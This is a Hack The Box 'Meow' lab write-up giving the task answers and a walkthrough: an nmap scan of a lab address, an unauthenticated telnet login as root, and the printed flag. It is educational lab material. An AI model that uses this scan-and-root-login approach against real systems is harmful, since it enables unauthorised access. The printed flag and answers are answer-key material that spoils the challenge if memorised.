# Meow
* Source: [Hack the Box](https://hackthebox.com/)
* Challenge: Meow
* Topic: Telnet
* Difficulty: Very easy
* Date: 12-04-2022
* Author: [DjikstraCS](https://github.com/DjikstraCS)

---
## Tasks
1. What does the acronym VM stand for? 
 - **virtual machine**
2. What tool do we use to interact with the operating system in order to start our VPN connection? 
- **terminal**
3. What service do we use to form our VPN connection? 
- **openvpn**
4. What is the abbreviated name for a tunnel interface in the output of your VPN boot-up sequence output? 
- **tun**
5. What tool do we use to test our connection to the target? 
- **ping**
6. What is the name of the tool we use to scan the target's ports? 
- **nmap**
7.  What service do we identify on port 23/tcp during our scans?
- **telnet**
8. What username ultimately works with the remote management login prompt for the target? 
- **root**

---
## Flag:
First, we need to scan the target with `nmap`.

Command:

`nmap -n -sC -sV 10.129.80.87`

`-n`: No DNS look up (Good [OPSEC](https://en.wikipedia.org/wiki/Operations_security)).

`-sC`: Run scripts during scan.

`-sV`: Try to detect the version of running services.

```console
┌──(kali㉿kali)-[~]
└─$ nmap -n -sC -sV 10.129.80.87                  
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-15 13:17 EDT
Nmap scan report for 10.129.80.87
Host is up (0.070s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The machine is running telnet on port 23.

Telnet: `telnet 10.129.80.87`

```console
┌──(kali㉿kali)-[~/Downloads]
└─$ telnet 10.129.80.87
Trying 10.129.80.87...
Connected to 10.129.80.87.
Escape character is '^]'.

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login: root
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 12 Apr 2022 02:05:01 PM UTC

  System load:           0.01
  Usage of /:            41.7% of 7.75GB
  Memory usage:          4%
  Swap usage:            0%
  Processes:             146
  Users logged in:       0
  IPv4 address for eth0: 10.129.80.87
  IPv6 address for eth0: dead:beef::250:56ff:fe96:9028

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

75 updates can be applied immediately.
31 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Sep  6 15:15:23 UTC 2021 from 10.10.14.18 on pts/0
```

We are connected! To see what files are in the current directory we can use `ls`.

```
root@Meow:~# ls
flag.txt  snap
```

And to see what a file contains we can use `cat`.

```
root@Meow:~# cat flag.txt 
b40abdfe23665f766f9c61ecba8a4c19
```

**Flag:** `b40abdfe23665f766f9c61ecba8a4c19`

---
**Tags:** [[Hack The Box]]